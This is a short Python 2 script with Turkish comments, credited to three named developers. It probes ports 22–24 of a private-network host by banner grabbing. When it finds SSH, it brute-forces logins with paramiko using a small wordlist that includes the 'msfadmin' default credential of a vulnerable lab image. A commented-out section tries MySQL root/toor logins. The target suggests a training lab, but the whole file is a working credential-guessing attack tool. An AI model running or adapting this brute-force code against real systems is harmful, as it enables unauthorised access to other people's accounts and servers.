import telnetlib
import paramiko
#import _mysql
#Aracı Geliştirenler:
#Ozancan Ertem
#Gürcan Tunca
#Anıl Baran Yelken
import time
bekleme=input("Beklemek icin zaman giriniz: ")
url="192.168.19.132"
portListe=[]
for port in range(22, 25, 1):
    try:
        baglanti = telnetlib.Telnet(url, str(port))
        baglanti.write("\n")
        servis = baglanti.read_all().splitlines()[0]
        if len(servis) >5:
            print "[+]", str(port), " - ",str(servis) ,"\n"
        else:
            print "[+]", str(port)
        portListe.append(servis)
        baglanti.close()
        if "SSH" in str(servis) or "ssh" in str(servis):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            Username = ["msfadmin", "calis", "deneme", "merhaba", "msfadmin"]
            Password = ["msfadmin", "calis", "deneme", "merhaba", "msfadmin"]
            for i in Username:
                for j in Password:
                    try:
                        sonuc = client.connect(url, username=i, password=j)
                        client.close()
                        print "[+]Username: ", i, " Password: ", j, " ile baglanti yapildi"
                    except:
                        print "[-]Username: ", i, " Password: ", j, " ile baglanti yapilamadi"
                        client.close()
                    time.sleep(int(bekleme))
        # if "MYSQL" in str(servis) or "mysql" in str(servis) or "Mysql" in str(servis):
        #     username = ["root", "toor"]
        #     password = ["root", "toor"]
        #     for i in username:
        #         for j in password:
        #             try:
        #                 db = _mysql.connect(host=str(url), user=i, passwd=j, db="mysql")
        #                 print("[+]" ,i, " username ve ", j, " parola icin giris yapildi")
        #             except:
        #                 print("[-]",i, " username ve ", j, " parola icin giris yapilamadi")
    except:
        pass